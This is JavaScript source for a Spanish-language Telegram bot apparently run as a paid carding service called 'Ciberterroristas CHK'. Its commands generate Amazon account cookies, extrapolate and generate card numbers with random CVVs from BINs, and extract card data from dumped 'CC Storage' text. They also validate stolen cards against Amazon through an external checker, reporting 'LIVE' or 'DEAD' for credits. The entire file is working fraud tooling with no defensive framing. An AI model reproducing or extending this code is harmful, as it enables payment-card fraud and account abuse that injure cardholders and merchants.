// ============================================
// BOT DE TELEGRAM - CIBERTERRORISTAS CHK
// Versión final corregida
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const { pool } = require('./database');

// ========== CONFIGURACIÓN CON VALORES POR DEFECTO ==========
const token = process.env.TELEGRAM_BOT_TOKEN;
const INTERNAL_API_URL = process.env.INTERNAL_API_URL || 'http://basedatos:8080/api';
const BOT_API_KEY = process.env.BOT_API_KEY || 'AALOL23894238HWKEJSNFSDGF';
const API_GENCOOKIE_URL = process.env.API_GENCOOKIE_URL || 'https://p01--gencookie--2bcj5drfqjzx.code.run';
const API_EXTRAPOLADOR_URL = process.env.API_EXTRAPOLADOR_URL || 'https://p01--extrapolador--2bcj5drfqjzx.code.run';

if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });
console.log('🤖 Bot de Telegram inicializado');

// ========== FUNCIONES PARA EXPORTAR (usadas por routes/telegram.js) ==========
async function sendVerificationCodeToUser(username, code) {
    try {
        const userResult = await pool.query(
            `SELECT id, telegram_chat_id FROM users WHERE username = $1`,
            [username.replace('@', '')]
        );
        if (userResult.rows.length === 0 || !userResult.rows[0].telegram_chat_id) {
            return { success: false, error: 'Usuario no encontrado o sin chat_id' };
        }
        await bot.sendMessage(
            userResult.rows[0].telegram_chat_id,
            `🔐 *Código de verificación:* ${code}\n⏰ Válido por 10 minutos.`,
            { parse_mode: 'Markdown' }
        );
        return { success: true };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function sendLiveToTelegram(chatId, mensaje) {
    try {
        await bot.sendMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        return { success: true };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// ========== FUNCIONES AUXILIARES ==========
async function getUserByTelegramId(telegramId) {
    const res = await pool.query(
        'SELECT id, username, credits, days_remaining FROM users WHERE telegram_id = $1',
        [telegramId]
    );
    return res.rows[0];
}

async function upsertUser(telegramId, username, chatId, chatType) {
    const now = new Date();
    let user = await pool.query('SELECT id, username FROM users WHERE telegram_id = $1', [telegramId]);
    if (user.rows.length > 0) {
        if (chatType === 'private') {
            await pool.query('UPDATE users SET telegram_chat_id = $1, updated_at = $2 WHERE telegram_id = $3', [chatId, now, telegramId]);
        }
        return;
    }
    user = await pool.query('SELECT id, username FROM users WHERE username = $1', [username]);
    if (user.rows.length > 0) {
        if (chatType === 'private') {
            await pool.query('UPDATE users SET telegram_id = $1, telegram_chat_id = $2, telegram_username = $3, updated_at = $4 WHERE username = $5', [telegramId, chatId, username, now, username]);
        } else {
            await pool.query('UPDATE users SET telegram_id = $1, telegram_username = $2, updated_at = $3 WHERE username = $4', [telegramId, username, now, username]);
        }
        return;
    }
    if (chatType === 'private') {
        await pool.query(`INSERT INTO users (telegram_id, telegram_username, telegram_chat_id, username, created_at) VALUES ($1, $2, $3, $4, $5)`, [telegramId, username, chatId, username, now]);
    } else {
        await pool.query(`INSERT INTO users (telegram_id, telegram_username, username, created_at) VALUES ($1, $2, $3, $4)`, [telegramId, username, username, now]);
    }
}

async function deductCredits(telegramId, amount = 3) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/use-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId, amount, bot_key: BOT_API_KEY }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        return data.success ? data.newCredits : null;
    } catch (error) {
        console.error('Error en deductCredits:', error);
        return null;
    }
}

function limpiarTarjetas(textoSucio) {
    const textoLimpio = textoSucio
        .replace(/\u200b/g, '')
        .replace(/[\u2060\u200C\u200D\uFEFF]/g, '')
        .replace(/\s+/g, ' ')
        .replace(/\[ShadowChk\] CC Storage \| /g, '')
        .replace(/\[mastercard.*?\]/g, '')
        .replace(/\[.*?\]/g, '')
        .replace(/\(.*?\)/g, '')
        .trim();
    const patron = /(\d{16})\s*[|│]\s*(\d{2})\s*[|│]\s*(\d{4})\s*[|│]\s*(\d{3})/g;
    const tarjetas = [];
    let match;
    while ((match = patron.exec(textoLimpio)) !== null) {
        const [_, num, mes, año, cvv] = match;
        if (num.length === 16 && mes.length === 2 && año.length === 4 && cvv.length === 3) {
            tarjetas.push(`${num}|${mes}|${año}|${cvv}`);
        }
    }
    return [...new Set(tarjetas)];
}

async function verificarTarjetasAmazon(tarjetas, cookies) {
    const resultados = [];
    for (const card of tarjetas) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 30000);
            const response = await fetch(`https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ card, cookies }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json();
            resultados.push({ card, status: data.status, message: data.message });
        } catch (error) {
            resultados.push({ card, status: 'ERROR', message: error.message });
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    return resultados;
}

// ========== COMANDOS ==========

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const telegramId = from.id;
    const username = from.username || telegramId.toString();
    const firstName = from.first_name || '';
    const chatType = msg.chat.type;
    try {
        const existing = await getUserByTelegramId(telegramId);
        const isNew = !existing;
        await upsertUser(telegramId, username, chatId, chatType);
        if (isNew) {
            await bot.sendMessage(chatId, `👋 ¡Hola ${firstName}! 👋\n\nHe guardado tu ID: <code>${telegramId}</code>\n\nRegístrate en: https://ciber7erroristaschk.com/login.html\nUsuario: @${username}\n\n👾 ¡Te esperamos!`, { parse_mode: 'HTML' });
        } else {
            await bot.sendMessage(chatId, `👋 ¡Hola ${firstName}!\n💰 Créditos: ${existing.credits}\n📅 Días: ${existing.days_remaining}\n\n✅ Servicios activos:\n• /gencookie MX\n• /extrapolador 123456\n• /chk amazon\n• /limpiador\n• /gen patrón\n\nUsa /menu`, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, '❌ Error interno.');
    }
});

bot.onText(/\/gencookie\s+(\w+)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const country = match[1].toUpperCase();
    if (!['MX','US','CA','UK','DE','FR','IT','ES','JP','AU','IN'].includes(country)) {
        return bot.sendMessage(chatId, `❌ País inválido. Usa: MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN`);
    }
    const user = await getUserByTelegramId(telegramId);
    if (!user) return bot.sendMessage(chatId, '❌ Usa /start primero.');
    if (user.credits < 3) return bot.sendMessage(chatId, '❌ Créditos insuficientes (3).');
    await bot.sendMessage(chatId, `🔄 Generando cookie para ${country}... (hasta 2 min)`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 500000);
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ country, add_address: true }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const textResponse = await response.text();
        if (!response.ok) throw new Error(`HTTP ${response.status}: ${textResponse.substring(0,100)}`);
        let data;
        try { data = JSON.parse(textResponse); } catch(e) { throw new Error('Respuesta no es JSON'); }
        if (!data.success || !data.data) throw new Error(data.error || 'Error del generador');
        const { phone, password, cookie_string, country: ctry } = data.data;
        let newCredits = null;
        try {
            newCredits = await deductCredits(telegramId, 3);
            if (newCredits === null) throw new Error('Fallo en descuento');
        } catch(creditError) { console.error('Error descontando créditos:', creditError); }
        let msgText = `🍪 *Cookie ${ctry}*\n📞 Teléfono: \`${phone}\`\n🔑 Pass: \`${password}\`\n🍪 Cookie:\n\`\`\`\n${cookie_string}\n\`\`\``;
        msgText += (newCredits !== null) ? `\n💰 Créditos restantes: ${newCredits}` : `\n⚠️ No se pudieron actualizar tus créditos, pero la cookie es válida.`;
        await bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
    } catch(error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

bot.onText(/\/extrapolador\s+(\d{6})/, async (msg, match) => {
    const chatId = msg.chat.id;
    const bin = match[1];
    await bot.sendMessage(chatId, `🔍 Extrapolando para BIN ${bin}...`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000);
        const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bin }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!data.success || !data.data || data.data.length === 0) {
            return bot.sendMessage(chatId, `❌ No se encontraron tarjetas para BIN ${bin}.`);
        }
        const patrones = {};
        for (const tarjeta of data.data) {
            const partes = tarjeta.split('|');
            if (partes.length < 3) continue;
            const numero = partes[0];
            const mes = partes[1];
            const año = partes[2];
            if (numero.length !== 16) continue;
            const prefix = numero.slice(0,12);
            const clave = `${prefix}xxxx|${mes}|${año}`;
            patrones[clave] = (patrones[clave] || 0) + 1;
        }
        if (Object.keys(patrones).length === 0) return bot.sendMessage(chatId, '❌ No se pudieron extraer patrones.');
        const muy = [], mod = [], uni = [];
        for (const [patron, count] of Object.entries(patrones)) {
            if (count >= 3) muy.push({ patron, count });
            else if (count === 2) mod.push({ patron, count });
            else uni.push({ patron, count });
        }
        muy.sort((a,b)=>b.count-a.count);
        mod.sort((a,b)=>b.count-a.count);
        uni.sort((a,b)=>b.count-a.count);
        let mensaje = `=== EXTRAPOLADOR - RESULTADOS ===\n\n`;
        if (muy.length) {
            mensaje += `🟢 PATRONES MUY REPETIDOS (${muy.length}):\n==================================================\n`;
            for (const p of muy.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            if (muy.length>15) mensaje += `... y ${muy.length-15} más.\n`;
            mensaje += `\n`;
        }
        if (mod.length) {
            mensaje += `🟡 PATRONES MODERADOS (${mod.length}):\n==================================================\n`;
            for (const p of mod.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            if (mod.length>15) mensaje += `... y ${mod.length-15} más.\n`;
            mensaje += `\n`;
        }
        if (uni.length) {
            mensaje += `🔴 PATRONES ÚNICOS (${uni.length}):\n==================================================\n`;
            for (const p of uni.slice(0,20)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} vez)\n`;
            }
            if (uni.length>20) mensaje += `... y ${uni.length-20} más.\n`;
        }
        if (mensaje.length > 4090) mensaje = mensaje.substring(0,4000) + "\n... (truncado)";
        await bot.sendMessage(chatId, mensaje, { parse_mode: 'Markdown' });
    } catch(error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

bot.onText(/\/gen\s+([^\s|]+\|\d{2}\|\d{2,4})(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let patron = match[1];
    let cantidad = match[2] ? parseInt(match[2]) : 10;
    if (cantidad > 50) cantidad = 50;
    try {
        const partes = patron.split('|');
        let [numBase, mes, año] = partes;
        const cvv = partes[3] || 'rnd';
        mes = mes.padStart(2,'0');
        año = año.length===2 ? `20${año}` : año;
        const digitosFijos = numBase.replace(/X/g,'');
        const cantidadX = (numBase.match(/X/g)||[]).length;
        const tarjetas = [];
        for(let i=0;i<cantidad;i++){
            let num = digitosFijos;
            for(let j=0;j<cantidadX;j++) num += Math.floor(Math.random()*10);
            if(num.length<16) num = num.padEnd(16,'0');
            if(num.length>16) num = num.slice(0,16);
            const cvvGen = cvv==='rnd' ? Math.floor(100+Math.random()*900).toString() : cvv;
            tarjetas.push(`${num}|${mes}|${año}|${cvvGen}`);
        }
        const lista = tarjetas.slice(0,20).map((t,i)=>`${i+1}. \`${t}\``).join('\n');
        const resto = tarjetas.length>20 ? `\n... y ${tarjetas.length-20} más` : '';
        await bot.sendMessage(chatId, `🎴 *Tarjetas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
    } catch(error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

bot.onText(/\/limpiador/, async (msg) => {
    const chatId = msg.chat.id;
    await bot.sendMessage(chatId, '📝 Envía el texto sucio:');
    const listener = async (responseMsg) => {
        if (responseMsg.chat.id === chatId && responseMsg.text && !responseMsg.text.startsWith('/')) {
            const tarjetas = limpiarTarjetas(responseMsg.text);
            if (tarjetas.length === 0) bot.sendMessage(chatId, '❌ No se encontraron tarjetas.');
            else {
                const lista = tarjetas.slice(0,30).map((t,i)=>`${i+1}. \`${t}\``).join('\n');
                bot.sendMessage(chatId, `🔍 *Tarjetas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
            }
            bot.removeListener('message', listener);
        }
    };
    bot.on('message', listener);
});

bot.onText(/\/chk\s+amazon(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let rawText = match[1];
    if (!rawText) {
        await bot.sendMessage(chatId, '📝 Envía las tarjetas:');
        const listener = async (responseMsg) => {
            if (responseMsg.chat.id === chatId && responseMsg.text && !responseMsg.text.startsWith('/')) {
                await procesarChkAmazon(chatId, telegramId, responseMsg.text);
                bot.removeListener('message', listener);
            }
        };
        bot.on('message', listener);
        return;
    }
    await procesarChkAmazon(chatId, telegramId, rawText);
});

async function procesarChkAmazon(chatId, telegramId, rawText) {
    try {
        const tarjetas = limpiarTarjetas(rawText);
        if (tarjetas.length === 0) return bot.sendMessage(chatId, '❌ No se encontraron tarjetas válidas.');
        if (tarjetas.length > 20) return bot.sendMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);
        const user = await getUserByTelegramId(telegramId);
        if (!user) return bot.sendMessage(chatId, '❌ Usa /start primero.');
        if (user.credits < 1) return bot.sendMessage(chatId, '❌ Necesitas 1 crédito.');
        const newCredits = await deductCredits(telegramId, 1);
        if (newCredits === null) return bot.sendMessage(chatId, '❌ Error al descontar créditos.');
        await bot.sendMessage(chatId, '🔑 Ahora envía la cookie de Amazon (obtenla con /gencookie).');
        const cookieListener = async (cookieMsg) => {
            if (cookieMsg.chat.id === chatId && cookieMsg.text && !cookieMsg.text.startsWith('/')) {
                const cookies = cookieMsg.text.trim();
                await bot.sendMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas...`);
                const resultados = await verificarTarjetasAmazon(tarjetas, cookies);
                let resumen = `📊 *Resultados* (Créditos restantes: ${newCredits})\n\n`;
                for (const r of resultados) {
                    const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
                    resumen += `${emoji} \`${r.card}\` → ${r.status}\n${r.message ? `   ${r.message}\n` : ''}`;
                }
                await bot.sendMessage(chatId, resumen, { parse_mode: 'Markdown' });
                bot.removeListener('message', cookieListener);
            }
        };
        bot.on('message', cookieListener);
    } catch(error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

bot.onText(/\/creditos|\/credits|\/saldo|\/dias/, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const user = await getUserByTelegramId(telegramId);
    if (!user) return bot.sendMessage(chatId, '❌ Usa /start primero.');
    bot.sendMessage(chatId, `💰 *Créditos:* ${user.credits}\n📅 *Días:* ${user.days_remaining}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/renovar/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `🔄 *Renovación*\nContacta a [@C1ber7errorist4sBot](https://t.me/C1ber7errorist4sBot)`, { parse_mode: 'Markdown', disable_web_page_preview: true });
});

bot.onText(/\/id/, async (msg) => {
    bot.sendMessage(msg.chat.id, `📋 *Tu ID:* \`${msg.from.id}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, async (msg) => {
    bot.sendMessage(msg.chat.id,
        `📖 *Comandos:*\n` +
        `/start - Vincular cuenta\n` +
        `/gencookie MX (o US,CA...) - Generar cookie (3 créditos)\n` +
        `/gen 549949056298xxxx|05|2029 [cantidad] - Generar tarjetas\n` +
        `/limpiador - Extraer tarjetas de texto sucio\n` +
        `/extrapolador 123456 - Buscar por BIN\n` +
        `/chk amazon [texto] - Verificar tarjetas (1 crédito)\n` +
        `/creditos - Ver saldo\n` +
        `/renovar - Contactar soporte\n` +
        `/id - Ver ID\n` +
        `/help - Esta ayuda`, { parse_mode: 'Markdown' });
});

bot.onText(/\/menu/, async (msg) => {
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
                [{ text: '🎴 Generar Tarjetas', callback_data: 'menu_gen' }],
                [{ text: '🧹 Limpiador', callback_data: 'menu_limpiador' }],
                [{ text: '🔍 Verificar Amazon', callback_data: 'menu_chk' }],
                [{ text: '💰 Créditos', callback_data: 'menu_creditos' }]
            ]
        }
    };
    bot.sendMessage(msg.chat.id, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;
    let respuesta = '';
    switch(data){
        case 'menu_gencookie': respuesta = 'Usa `/gencookie MX` (o US, CA...). Cuesta 3 créditos.'; break;
        case 'menu_gen': respuesta = 'Usa `/gen 549949056298xxxx|05|2029 15`'; break;
        case 'menu_limpiador': respuesta = 'Usa `/limpiador` y luego envía el texto sucio.'; break;
        case 'menu_chk': respuesta = 'Usa `/chk amazon` y luego envía las tarjetas.'; break;
        case 'menu_creditos': respuesta = 'Usa `/creditos` para ver tu saldo.'; break;
        default: respuesta = 'Opción no válida.';
    }
    await bot.sendMessage(chatId, respuesta, { parse_mode: 'Markdown' });
    await bot.answerCallbackQuery(callbackQuery.id);
});

module.exports = { bot, sendVerificationCodeToUser, sendLiveToTelegram };
console.log('✅ Bot de Telegram listo');